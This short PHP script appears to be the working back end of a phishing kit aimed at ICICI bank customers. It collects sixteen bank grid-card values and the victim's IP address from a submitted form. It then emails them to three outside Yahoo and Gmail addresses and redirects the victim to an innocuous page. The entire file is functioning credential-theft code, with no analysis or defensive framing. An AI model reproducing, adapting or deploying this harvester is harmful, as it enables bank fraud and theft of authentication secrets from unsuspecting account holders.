<?
$ip = getenv("REMOTE_ADDR");
$message .= "---created By DON PERO---\n";
$message .= "Grid Value A: ".$_POST['a']."\n";
$message .= "Grid Value B: ".$_POST['b']."\n";
$message .= "Grid Value C: ".$_POST['c']."\n";
$message .= "Grid Value D: ".$_POST['d']."\n";
$message .= "Grid Value E: ".$_POST['e']."\n";
$message .= "Grid Value F: ".$_POST['f']."\n";
$message .= "Grid Value G: ".$_POST['g']."\n";
$message .= "Grid Value H: ".$_POST['h']."\n";
$message .= "Grid Value I: ".$_POST['i']."\n";
$message .= "Grid Value J: ".$_POST['j']."\n";
$message .= "Grid Value K: ".$_POST['k']."\n";
$message .= "Grid Value L: ".$_POST['l']."\n";
$message .= "Grid Value M: ".$_POST['m']."\n";
$message .= "Grid Value N: ".$_POST['n']."\n";
$message .= "Grid Value O: ".$_POST['o']."\n";
$message .= "Grid Value P: ".$_POST['p']."\n";

$message .= "IP: ".$ip."\n";


$recipient = "ricksmithnig45@yahoo.co.jp, jameskumarpvtltd@gmail.com, anandshreepvtltd@gmail.com";
$subject = " IIIIIICICI: ".$ip."\n";
$headers = "MIME-Version: 1.0\n";

if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: info.html");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>